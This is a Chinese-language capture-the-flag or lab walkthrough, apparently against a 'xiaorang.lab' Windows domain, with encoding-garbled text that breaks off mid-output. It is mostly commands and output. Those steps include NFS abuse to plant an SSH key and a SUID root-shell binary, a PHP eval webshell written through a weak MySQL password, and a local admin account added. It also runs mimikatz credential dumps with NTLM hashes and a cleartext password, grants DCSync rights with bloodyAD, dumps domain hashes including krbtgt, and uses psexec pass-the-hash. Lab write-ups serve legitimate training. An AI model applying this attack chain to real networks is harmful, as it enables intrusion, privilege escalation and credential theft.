[SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:3306[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:8000[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:8080[2025-04-27 15:59:55] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.57:22 =&gt; [ssh] ç‰ˆæœ¬: 7.4 äº§å“: OpenSSH ä¿¡æ¯: protocol 2.0 Banner: [SSH-2.0-OpenSSH_7.4.][2025-04-27 15:59:56] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:22 =&gt; [ssh] ç‰ˆæœ¬: 8.2p1 Ubuntu 4ubuntu0.5 äº§å“: OpenSSH ç³»ç»Ÿ: Linux ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-27 15:59:56] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:21 =&gt; [ftp] ç‰ˆæœ¬: 3.0.3 äº§å“: vsftpd ç³»ç»Ÿ: Unix Banner: [220 (vsFTPd 3.0.3).][2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.57:80 =&gt; [http] ç‰ˆæœ¬: 1.20.1 äº§å“: nginx[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:445 =&gt;[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:88 =&gt;[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:80 =&gt; [http][2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:139 =&gt; Banner: [.][2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:389 =&gt;[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:139 =&gt; Banner: [.][2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:445 =&gt;[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:8000 =&gt;[2025-04-27 16:00:02] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:8080 =&gt; [http][2025-04-27 16:00:02] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:80 =&gt; [http][2025-04-27 16:00:09] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:3306 =&gt; Banner: [!.#08S01Got packets out of order][2025-04-27 16:01:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:135 =&gt;[2025-04-27 16:01:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:135 =&gt;[2025-04-27 16:01:01] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17[2025-04-27 16:01:01] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-27 16:01:01] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.57 çŠ¶æ€ç : 200 é•¿åº¦: 4833 æ ‡é¢˜: Welcome to CentOS[2025-04-27 16:01:01] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.13.6ä¸»æœºå: WIN-DCå‘ç°çš„ç½‘ç»œæ¥å£: IPv4 åœ°å€: â””â”€ 172.22.13.6[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.28 çŠ¶æ€ç : 200 é•¿åº¦: 2525 æ ‡é¢˜: æ¬¢è¿ç™»å½• OA åŠå…¬å¹³å°[2025-04-27 16:01:01] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ![2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.6 DC: XIAORANG\\WIN-DC[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.14 çŠ¶æ€ç : 200 é•¿åº¦: 10918 æ ‡é¢˜: Apache2 Ubuntu Default Page: It works[2025-04-27 16:01:01] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.13.28ä¸»æœºå: WIN-HAUWOLAOå‘ç°çš„ç½‘ç»œæ¥å£: IPv4 åœ°å€: â””â”€ 172.22.13.28[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.28 WIN-HAUWOLAO.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.14:8080 çŠ¶æ€ç : 200 é•¿åº¦: 3655 æ ‡é¢˜: å…¬å¸å‘è´§å•[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.28:8000 çŠ¶æ€ç : 200 é•¿åº¦: 170 æ ‡é¢˜: Nothing Here. é¢˜ç›®æç¤ºäº†è¦æ‰“ NFSï¼Œå…ˆæ‰«ä¸€ä¸‹ 2049 çš„ç«¯å£ 123456789101112131415161718192021222324root@ubuntu:~# ./fscan2 -h 172.22.13.14/24 -p 2049â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ â”‚â”‚ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-27 16:07:15] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-27 16:07:15] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-27 16:07:15] [INFO] CIDR èŒƒå›´: 172.22.13.0-172.22.13.255[2025-04-27 16:07:15] [INFO] ç”Ÿæˆ IP èŒƒå›´: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)[2025-04-27 16:07:16] [INFO] è§£æ CIDR 172.22.13.14/24 -&gt; IP èŒƒå›´ 172.22.13.0-172.22.13.255[2025-04-27 16:07:16] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-04-27 16:07:16] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.6 å­˜æ´» (ICMP)[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.14 å­˜æ´» (ICMP)[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.28 å­˜æ´» (ICMP)[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.57 å­˜æ´» (ICMP)[2025-04-27 16:07:19] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4[2025-04-27 16:07:19] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 1[2025-04-27 16:07:19] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.57:2049 172.22.13.57 å¼€äº† 2049 çš„ç«¯å£ 1234567#åœ¨é¶æœºä¸Šæ“ä½œroot@ubuntu:~# showmount -e 172.22.13.57Export list for 172.22.13.57:/home/joyce *root@ubuntu:~# cd /tmproot@ubuntu:/tmp# mkdir testroot@ubuntu:/tmp# mount -t nfs 172.22.13.57:/ ./test -o nolock ç„¶å joyce çš„å®¶ç›®å½•å°±è¢«æˆåŠŸæŒ‚è½½äº†ï¼Œå†™ä¸€ä¸ªå…¬é’¥è¿›å» 123root@ubuntu:/tmp/test/home/joyce# mkdir .sshroot@ubuntu:/tmp/test/home/joyce# cd .sshroot@ubuntu:/tmp/test/home/joyce/.ssh# echo &#x27;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcatU49PfwyMAfrfJcaaIFCNOJNWOdDonEg3ahNxG8H root@kali&#x27;&gt; authorized_keys ç„¶å ssh è¿æ¥ 1234567891011121314151617181920212223242526â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/123]â””â”€# proxy -f proxychains4.conf ssh joyce@172.22.13.57[proxychains] config file found: proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.22.13.57:22 ... OKThe authenticity of host &#x27;172.22.13.57 (172.22.13.57)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256: Y8qbRlvlJKReDyk1mEsy/A7aQosNyeucM/GZs7aI8SA.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;172.22.13.57&#x27; (ED25519) to the list of known hosts.Last login: Thu Aug 11 18:16:01 2022Welcome to Alibaba Cloud Elastic Compute Service ![joyce@centos ~]$ ls[joyce@centos ~]$ ls -altotal 28drwx------ 3 joyce joyce 4096 Apr 27 16:11 .drwxr-xr-x. 4 root root 4096 Aug 10 2022 ..-rw------- 1 joyce joyce 5 Aug 11 2022 .bash_history-rw-r--r-- 1 joyce joyce 18 Nov 25 2021 .bash_logout-rw-r--r-- 1 joyce joyce 193 Nov 25 2021 .bash_profile-rw-r--r-- 1 joyce joyce 231 Nov 25 2021 .bashrcdrwxr-xr-x 2 root root 4096 Apr 27 16:12 .ssh[joyce@centos ~]$ å°è¯•ææƒï¼ŒæŸ¥æ‰¾ suid æƒé™ 123456789101112131415161718192021[joyce@centos ~]$ find / -perm -u = s 2 &gt;/dev/null/usr/libexec/dbus-1/dbus-daemon-launch-helper/usr/sbin/unix_chkpwd/usr/sbin/pam_timestamp_check/usr/sbin/usernetctl/usr/sbin/mount.nfs/usr/bin/sudo/usr/bin/chage/usr/bin/at/usr/bin/mount/usr/bin/crontab/usr/bin/passwd/usr/bin/chsh/usr/bin/pkexec/usr/bin/newgrp/usr/bin/su/usr/bin/chfn/usr/bin/gpasswd/usr/bin/ftp/usr/bin/umount/usr/lib/polkit-1/polkit-agent-helper-1 ftp ææƒå¯ä»¥è¯»æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ nfs ä¸Šä¼ ä¸€ä¸ªæ¶æ„æ–‡ä»¶æ‹¿åˆ° shell 1234567891011121314root@ubuntu:/tmp# echo &#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27; &gt; root.croot@ubuntu:/tmp# gcc root.c -o rootroot.c: In function â€˜mainâ€™:root.c: 1:14: warning: implicit declaration of function â€˜setgidâ€™ [-Wimplicit-function-declaration] 1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125; | ^~~~~~root.c: 1:25: warning: implicit declaration of function â€˜setuidâ€™ [-Wimplicit-function-declaration] 1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125; | ^~~~~~root.c: 1:36: warning: implicit declaration of function â€˜systemâ€™ [-Wimplicit-function-declaration] 1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125; |root@ubuntu:/tmp# chmod +s ./rootroot@ubuntu:/tmp# mv root ./test/home/joyce/ 12345[joyce@centos ~]$ lsroot[joyce@centos ~]$ ./root[root@centos ~]# iduid = 0(root) gid = 0(root) groups = 0(root),994(joyce) flag02 åœ¨æ ¹ç›®å½•ä¸‹ FLAG03 172.22.13.28 æ˜¯ä¸€ä¸ª OA ç³»ç»Ÿï¼Œç”¨ fscan æ‰«ä¸€ä¸‹å…¨ç«¯å£ï¼Œå¯ä»¥æ‰«åˆ° mysql æœ‰å¼±å£ä»¤ 1root: 123456 navicat è¿æ¥ 123456789101112131415mysql &gt; show variables like &quot;secure_file_priv&quot;;+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | |+------------------+-------+1 row in set (0.05 sec)mysql &gt; show variables like &quot;%general%&quot;;+------------------+--------------------------------------------------------------+| Variable_name | Value |+------------------+--------------------------------------------------------------+| general_log | OFF || general_log_file | C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\WIN-HAUWOLAO.log |+------------------+--------------------------------------------------------------+2 rows in set (0.06 sec) å°è¯•å†™é©¬ 12mysql &gt; select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;Query OK, 1 row affected (0.03 sec) ç„¶åèšå‰‘è¿æ¥ï¼Œflag03 åœ¨ C:/Users/Administrator/flag/ä¸‹ FLAG04åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œæ·»åŠ è¿›ç”¨æˆ·ç»„é‡Œ 12345C:\\Users\\Administrator\\flag &gt; net user lv Asd123123 /addå‘½ä»¤æˆåŠŸå®Œæˆã€‚ C:\\Users\\Administrator\\flag &gt; net localgroup administrators lv /addå‘½ä»¤æˆåŠŸå®Œæˆã€‚ ç„¶åè¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œä¸Šä¼ ä¸€ä¸ª mimikatz æŠ“å–å“ˆå¸Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303 .#####. mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36 .## ^ ##. &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#x27;## v ##&#x27; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#x27;#####&#x27; &gt; http://pingcastle.com / http://mysmartlogon.com ***/mimikatz # privilege:: debugPrivilege &#x27;20&#x27; OKmimikatz # logUsing &#x27;mimikatz.log&#x27; for logfile : OKmimikatz # sekurlsa:: logonpasswordsAuthentication Id : 0 ; 11159151 (00000000:00aa466f)Session : RemoteInteractive from 2User Name : lvDomain : WIN-HAUWOLAOLogon Server : WIN-HAUWOLAOLogon Time : 2025/4/27 16:53:43SID : S-1-5-21-2057596273-973658165-3030246172-1000 msv : [00000003] Primary * Username : lv * Domain : WIN-HAUWOLAO * NTLM : 85edf6aacad2ac8e2a7a44741eb0b236 * SHA1 : aab02ea07aee541e9f60a1f6d5a54a2045965743 tspkg : wdigest : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) kerberos : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) ssp : credman :Authentication Id : 0 ; 11136230 (00000000:00a9ece6)Session : Interactive from 2User Name : DWM-2Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 16:53:43SID : S-1-5-90-0-2 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 11136190 (00000000:00a9ecbe)Session : Interactive from 2User Name : DWM-2Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 16:53:43SID : S-1-5-90-0-2 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 91296 (00000000:000164a0)Session : Service from 0User Name : chengleiDomain : XIAORANGLogon Server : WIN-DCLogon Time : 2025/4/27 15:43:55SID : S-1-5-21-3269458654-3569381900-10559451-1105 msv : [00000003] Primary * Username : chenglei * Domain : XIAORANG * NTLM : 0c00801c30594a1b8eaa889d237c5382 * SHA1 : e8848f8a454e08957ec9814b9709129b7101fad7 * DPAPI : 89b179dc738db098372c365602b7b0f4 tspkg : wdigest : * Username : chenglei * Domain : XIAORANG * Password : (null) kerberos : * Username : chenglei * Domain : XIAORANG.LAB * Password : Xt61f3LBhg1 ssp : credman :Authentication Id : 0 ; 53263 (00000000:0000d00f)Session : Interactive from 1User Name : DWM-1Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-90-0-1 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : b5cd3591a58e1169186bcdbfd4b6322d * SHA1 : 226ee6b5e527e5903988f08993a2456e3297ee1f tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : `k+hcEDFvtzoObj=&gt;DvzxiNqwyEn;Eu-\\zFVAh&gt;.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB&#x27;LLG6wSx6TR%m;` Nfr;; Hf8O&#x27;Szfl0Z = w+^,&gt; 0jR ssp : credman :Authentication Id : 0 ; 996 (00000000:000003e4)Session : Service from 0User Name : WIN-HAUWOLAO$Domain : XIAORANGLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-20 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : win-hauwolao$ * Domain : XIAORANG.LAB * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 24185 (00000000:00005e79)Session : UndefinedLogonType from 0User Name : (null)Domain : (null)Logon Server : (null)Logon Time : 2025/4/27 15:43:52SID : msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : kerberos : ssp : credman :Authentication Id : 0 ; 11159180 (00000000:00aa468c)Session : RemoteInteractive from 2User Name : lvDomain : WIN-HAUWOLAOLogon Server : WIN-HAUWOLAOLogon Time : 2025/4/27 16:53:43SID : S-1-5-21-2057596273-973658165-3030246172-1000 msv : [00000003] Primary * Username : lv * Domain : WIN-HAUWOLAO * NTLM : 85edf6aacad2ac8e2a7a44741eb0b236 * SHA1 : aab02ea07aee541e9f60a1f6d5a54a2045965743 tspkg : wdigest : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) kerberos : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) ssp : credman :Authentication Id : 0 ; 91297 (00000000:000164a1)Session : Service from 0User Name : chengleiDomain : XIAORANGLogon Server : WIN-DCLogon Time : 2025/4/27 15:43:55SID : S-1-5-21-3269458654-3569381900-10559451-1105 msv : [00000003] Primary * Username : chenglei * Domain : XIAORANG * NTLM : 0c00801c30594a1b8eaa889d237c5382 * SHA1 : e8848f8a454e08957ec9814b9709129b7101fad7 * DPAPI : 89b179dc738db098372c365602b7b0f4 tspkg : wdigest : * Username : chenglei * Domain : XIAORANG * Password : (null) kerberos : * Username : chenglei * Domain : XIAORANG.LAB * Password : Xt61f3LBhg1 ssp : credman :Authentication Id : 0 ; 997 (00000000:000003e5)Session : Service from 0User Name : LOCAL SERVICEDomain : NT AUTHORITYLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-19 msv : tspkg : wdigest : * Username : (null) * Domain : (null) * Password : (null) kerberos : * Username : (null) * Domain : (null) * Password : (null) ssp : credman :Authentication Id : 0 ; 53235 (00000000:0000cff3)Session : Interactive from 1User Name : DWM-1Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-90-0-1 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 999 (00000000:000003e7)Session : UndefinedLogonType from 0User Name : WIN-HAUWOLAO$Domain : XIAORANGLogon Server : (null)Logon Time : 2025/4/27 15:43:52SID : S-1-5-18 msv : tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : win-hauwolao$ * Domain : XIAORANG.LAB * Password : (null) ssp : credman :mimikatz # \\ æ‹¿åˆ°äº†ä¸€ä¸ªåŸŸå†…ç”¨æˆ· chengleiï¼ŒæŸ¥çœ‹ chenglei çš„åŸŸå†…æƒé™ 1234567891011121314151617181920212223C:\\Users\\Administrator\\flag &gt; net user chenglei /domainè¿™é¡¹è¯·æ±‚å°†åœ¨åŸŸ xiaorang.lab çš„åŸŸæ§åˆ¶å™¨å¤„ç†ã€‚ç”¨æˆ·å chengleiå…¨å æ³¨é‡Š ç”¨æˆ·çš„æ³¨é‡Š å›½å®¶/åœ°åŒºä»£ç  000 (ç³»ç»Ÿé»˜è®¤å€¼)å¸æˆ·å¯ç”¨ Yeså¸æˆ·åˆ°æœŸ ä»ä¸ä¸Šæ¬¡è®¾ç½®å¯†ç  2023/7/11 14:57:52å¯†ç åˆ°æœŸ ä»ä¸å¯†ç å¯æ›´æ”¹ 2023/7/12 14:57:52éœ€è¦å¯†ç  Yesç”¨æˆ·å¯ä»¥æ›´æ”¹å¯†ç  Yeså…è®¸çš„å·¥ä½œç«™ Allç™»å½•è„šæœ¬ ç”¨æˆ·é…ç½®æ–‡ä»¶ ä¸»ç›®å½• ä¸Šæ¬¡ç™»å½• 2025/4/27 16:57:57å¯å…è®¸çš„ç™»å½•å°æ—¶æ•° Allæœ¬åœ°ç»„æˆå‘˜ å…¨å±€ç»„æˆå‘˜ *ACL Admin * Domain Users å‘½ä»¤æˆåŠŸå®Œæˆã€‚ å±äº ACL Admin ç»„ï¼Œè¿™ä¸ªç»„æœ‰ WriteDACL çš„æƒé™ï¼Œç»™ chenglei å»æ·»åŠ  DCSync æƒé™ 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/123]â””â”€# bloodyAD --host 172.22.13.6 -d &quot;XIAORANG.LAB&quot; -u chenglei -p Xt61f3LBhg1 add dcsync &quot;chenglei&quot;[+] chenglei is now able to DCSync ç„¶åç”¨ chenglei è¿œç¨‹ç™»å½• mimikatz æŠ“å–åŸŸå†…å“ˆå¸Œ 1234567891011mimikatz # lsadump:: dcsync /domian: xiaorang.lab /all /csv[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;WIN-DC.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;1104 zhangwen fa7d776fdfc82d3f43c9d8b7f5312d77 512502 krbtgt cb976ec1a1bf8a14a15142c6fecc540e 5141106 zhangtao e786c4a4987ced162c496d0519496729 5121000 WIN-DC$ 5a5c8ad1abcec444c534563d7db5c332 532480500 Administrator 6341235defdaed66fb7b682665752c9a 5121105 chenglei 0c00801c30594a1b8eaa889d237c5382 5121103 WIN-HAUWOLAO$ 00f24a2e0e0076b23f55b10e54d4cc25 4096 ç„¶åæ¨ªå‘å°±è¡Œäº† 1234567891011121314151617181920212223â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/123]â””â”€# impacket-psexec -hashes : 6341235defdaed66fb7b682665752c9a Administrator@172.22.13.6Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Requesting shares on 172.22.13.6.....[*] Found writable share 